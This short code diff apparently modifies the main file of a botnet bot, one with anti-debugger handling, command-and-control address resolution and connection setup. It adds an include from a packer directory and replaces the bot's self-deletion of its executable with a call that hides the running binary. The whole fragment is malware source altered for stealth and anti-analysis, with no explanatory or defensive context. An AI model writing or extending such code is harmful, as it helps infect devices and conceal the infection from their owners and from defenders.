@@ -24,6 +24,8 @@
 #include "util.h"
 #include "resolv.h"
 
+#include "../papaw/exe.c"
+
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -58,7 +60,7 @@ int main(int argc, char **args)
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    papaw_do_hide_exe(args[0], true);
 
     // Signal based control flow
     sigemptyset(&sigs);
